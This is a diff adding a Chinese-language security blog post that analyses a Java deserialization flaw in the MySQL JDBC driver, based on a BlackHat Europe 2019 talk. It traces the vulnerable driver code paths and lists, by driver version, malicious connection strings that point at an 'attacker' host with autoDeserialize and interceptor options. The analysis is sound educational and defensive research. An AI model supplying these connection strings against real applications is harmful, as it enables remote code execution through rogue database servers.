@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <title>MySQL JDBC客户端反序列化漏洞分析-fuzz7j's Blog</title>
+  <meta charset="utf-8" />
+  <meta http-equiv="content-language" content="zh-CN" />
+  <meta name="theme-color" content="#ffffff" />
+  <meta name="supported-color-schemes" content="light dark">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="applicable-device" content="pc,mobile">
+  <meta name="author" content="" />
+  <meta name="description" content="MySQL JDBC客户端反序列化漏洞分析"/>
+  <meta name="keywords" content=",Java"/>
+  <link rel="icon" href="/static/img/favicon.ico" />
+  <link rel="apple-touch-icon" href="/static/img/logo.png" />
+  <link rel="stylesheet" href="/static/css/common.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/theme-dark.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/post.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/code-dark.css?t=20230716172519">
+  <link rel="stylesheet" href="/static/css/code-light.css?t=20230716172519">
+  <link rel="prefetch" href="/static/xml/search.xml?t=20230716172519">
+  <link rel="prefetch" href="/static/js/search.js?t=20230716172519">
+  <script>
+    window.blog = {
+      baseurl:"",
+      buildAt:"20230716172519",
+      darkTheme: false,
+      setDarkTheme: function (dark) {
+        this.darkTheme = Boolean(dark);
+        document.documentElement.className = this.darkTheme ? 'dark': '';
+        document.querySelector('meta[name=theme-color]').setAttribute('content', this.darkTheme ? '#2D2E32': '#FFFFFF');
+      }
+    }
+    if (sessionStorage.darkTheme !== undefined) {
+      blog.setDarkTheme(sessionStorage.darkTheme === 'true'); // 记忆值，单个窗口内有效
+    } else {
+      blog.setDarkTheme(window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches); // 跟随系统
+    }
+    if (window.matchMedia) {
+      var media = window.matchMedia('(prefers-color-scheme: dark)');
+      media.addListener(function (ev) {
+        blog.setDarkTheme(ev.currentTarget.matches);
+        sessionStorage.removeItem('darkTheme');
+      });
+    }
+  </script>
+</head>
+<body ondragstart="return false;">
+<header class="header">
+  <img class="logo" src="/static/img/logo.jpg" alt="logo"/>
+  <nav class="menu">
+    <a href="/" class="hover-underline">首页</a>
+    <a href="/pages/categories" class="hover-underline">归档</a>
+    <a href="/pages/search" class="hover-underline">搜索</a>
+    <a href="/pages/links" class="hover-underline">友链</a>
+    <a href="/pages/about" class="hover-underline">关于</a>
+    </nav>
+</header>
+<div class="page page-post">
+  <h1 class="title" id="MySQL JDBC客户端反序列化漏洞分析">MySQL JDBC客户端反序列化漏洞分析</h1>
+  
+  <div class="subtitle"> 于 2022-05-27 发布</div>
+  
+  <div class="post">
+    <h2 id="前言">前言</h2>
+
+<p>BlackHat Europe 2019 《New Exploit Technique In Java Deserialization Attack》 议题学习。</p>
+
+<h2 id="java-database-connectivity">Java DataBase Connectivity</h2>
+
+<p>JDBC（Java Database Connectivity）是Java程序访问数据库的标准接口。</p>
+
+<p>使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+    <span class="nc">String</span> <span class="no">DB_URL</span> <span class="o">=</span> <span class="s">"jdbc:mysql://127.0.0.1:3306/sectest?var=value"</span><span class="o">;</span>
+    <span class="nc">Driver</span> <span class="n">driver</span> <span class="o">=</span> <span class="k">new</span> <span class="n">com</span><span class="o">.</span><span class="na">mysql</span><span class="o">.</span><span class="na">jdbc</span><span class="o">.</span><span class="na">Driver</span><span class="o">();</span>
+    <span class="nc">Connection</span> <span class="n">conn</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="na">connect</span><span class="o">(</span><span class="no">DB_URL</span><span class="o">,</span> <span class="n">props</span><span class="o">);</span>
+    <span class="nc">Statement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="na">createStatement</span><span class="o">(</span><span class="nc">ResultSet</span><span class="o">.</span><span class="na">TYPE_SCROLL_SENSITIVE</span><span class="o">,....);</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>JDBC 通常使用不同的 URL/URI 连接字符串来与指定类型的数据库建立连接，这个 URL 主要包含三个部分: 驱动名称、连接地址以及扩展参数。</p>
+
+<p><img src="1.png" alt="image" /></p>
+
+<h2 id="漏洞环境">漏洞环境</h2>
+
+<p>https://github.com/fuzz7j/JavaSecuritySourceCode/MySQL_JDBC_Deserialization</p>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>根据PPT看到入口点为 <code class="highlighter-rouge">com.mysql.cj.jdbc.result.ResultSetImpl#getObject</code></p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="nc">Object</span> <span class="nf">getObject</span><span class="o">(</span><span class="kt">int</span> <span class="n">columnIndex</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">SQLException</span> <span class="o">{</span>
+<span class="o">...</span>
+<span class="k">case</span> <span class="nl">BLOB:</span>
+    <span class="c1">// autoDeserialize为开启状态则继续</span>
+    <span class="k">if</span> <span class="o">((</span><span class="nc">Boolean</span><span class="o">)</span><span class="k">this</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">getPropertySet</span><span class="o">().</span><span class="na">getBooleanProperty</span><span class="o">(</span><span class="s">"autoDeserialize"</span><span class="o">).</span><span class="na">getValue</span><span class="o">())</span> <span class="o">{</span>
+        <span class="nc">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">data</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="nc">ByteArrayInputStream</span> <span class="n">bytesIn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ByteArrayInputStream</span><span class="o">(</span><span class="n">data</span><span class="o">);</span>
+            <span class="nc">ObjectInputStream</span> <span class="n">objIn</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="n">bytesIn</span><span class="o">);</span>
+            <span class="n">obj</span> <span class="o">=</span> <span class="n">objIn</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+            <span class="n">objIn</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+            <span class="n">bytesIn</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+            <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>当MySQL字段类型为BLOB时，会触发readObject进行反序列化。</p>
+
+<h3 id="serverstatusdiffinterceptor触发方式">ServerStatusDiffInterceptor触发方式</h3>
+
+<p>作者利用扩展参数<code class="highlighter-rouge">queryInterceptors</code>来触发getObject方法。</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>queryInterceptors: 实现 com.mysql.cj.interceptors.QueryInterceptor 的类的逗号分隔列表，应放置在查询执行“中间”以影响结果。
+</code></pre></div></div>
+
+<p>在<code class="highlighter-rouge">com.mysql.cj.interceptors.QueryInterceptor</code>的实现类中， <code class="highlighter-rouge">com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code>会调用getObject方法。</p>
+
+<p><code class="highlighter-rouge">populateMapWithSessionStatusValues</code>执行一次<code class="highlighter-rouge">SHOW SESSION STATUS</code>查询，并调用<code class="highlighter-rouge">ResultSetUtil.resultSetToMap(toPopulate, rs)</code>处理结果。</p>
+
+<p><img src="2.png" alt="image" /></p>
+
+<p>resultSetToMap调用了getObject方法，构成一条利用链。</p>
+
+<p><img src="3.png" alt="image" /></p>
+
+<h3 id="detectcustomcollations触发方式">detectCustomCollations触发方式</h3>
+
+<p>扩展参数<code class="highlighter-rouge">detectCustomCollations</code>是从5.1.29开始支持的，在5.1.29之前，此选项默认为True。</p>
+
+<p>触发点为<code class="highlighter-rouge">com.mysql.jdbc.ConnectionImpl#buildCollationMapping</code>。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">private</span> <span class="kt">void</span> <span class="nf">buildCollationMapping</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">SQLException</span> <span class="o">{</span>
+<span class="o">...</span>
+<span class="c1">// 服务器版本大于等于4.1.0 且detectCustomCollations为True</span>
+<span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">versionMeetsMinimum</span><span class="o">(</span><span class="mi">4</span><span class="o">,</span> <span class="mi">1</span><span class="o">,</span> <span class="mi">0</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="o">.</span><span class="na">getDetectCustomCollations</span><span class="o">())</span> <span class="o">{</span>
+    <span class="n">java</span><span class="o">.</span><span class="na">sql</span><span class="o">.</span><span class="na">Statement</span> <span class="n">stmt</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="nc">ResultSet</span> <span class="n">results</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="n">results</span> <span class="o">=</span> <span class="n">stmt</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">(</span><span class="s">"SHOW COLLATION"</span><span class="o">);</span>
+        <span class="c1">// 服务器版本大于等于5.0.0</span>
+        <span class="n">f</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">versionMeetsMinimum</span><span class="o">(</span><span class="mi">5</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="mi">0</span><span class="o">))</span> <span class="o">{</span>
+        <span class="nc">Util</span><span class="o">.</span><span class="na">resultSetToMap</span><span class="o">(</span><span class="n">sortedCollationMap</span><span class="o">,</span> <span class="n">results</span><span class="o">,</span> <span class="mi">3</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<h2 id="可用连接串">可用连接串</h2>
+
+<h3 id="serverstatusdiffinterceptor触发方式-1">ServerStatusDiffInterceptor触发方式</h3>
+
+<h4 id="8x">8.x</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jdbc:mysql://attacker/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true
+</code></pre></div></div>
+
+<h4 id="6x">6.x</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jdbc:mysql://attacker/db?statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true
+</code></pre></div></div>
+
+<h4 id="51x5111及以上">5.1.x（5.1.11及以上）</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jdbc:mysql://attacker/db?statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true
+</code></pre></div></div>
+
+<h4 id="51x5110及以下">5.1.x（5.1.10及以下）</h4>
+
+<p>连接时的SQL查询是在createNewIO方法中触发，但5.1.10及以前版本，Interceptors的初始化在createNewIO之后，导致查询触发前还不存在Interceptors，故无法通过连接直接触发。
+<img src="4.png" alt="image" /></p>
+
+<h4 id="50x">5.0.x</h4>
+
+<p>不可用</p>
+
+<h3 id="detectcustomcollations触发方式-1">detectCustomCollations触发方式</h3>
+
+<h4 id="51x5141及以上">5.1.x（5.1.41及以上）</h4>
+
+<p>不可用</p>
+
+<h4 id="5129-5140">5.1.29-5.1.40</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jdbc:mysql://attacker/db?detectCustomCollations=true&amp;autoDeserialize=true
+</code></pre></div></div>
+
+<h4 id="5128-5119">5.1.28-5.1.19</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jdbc:mysql://attacker/db?autoDeserialize=true
+</code></pre></div></div>
+
+<h4 id="51x5118及以下">5.1.x（5.1.18及以下）</h4>
+
+<p>不可用</p>
+
+<h4 id="50x版本">5.0.x版本</h4>
+
+<p>不可用</p>
+
+<h2 id="参考链接">参考链接</h2>
+
+<p>https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf<br />
+https://www.anquanke.com/post/id/203086<br />
+https://paper.seebug.org/1832/</p>
+
+  </div>
+  
+</div>
+<footer class="footer">
+  <span></span>
+  <span text-align: center>Copyright © 2021 fuzz7j</span>
+</footer>
+<div id="to-top">
+  <span></span>
+  <span></span>
+</div><script type="text/javascript" src="/static/js/blog.js?t=20230716172519"></script>
+<script type="text/javascript" src="/static/js/search.js?t=20230716172519"></script></body>
+</html>
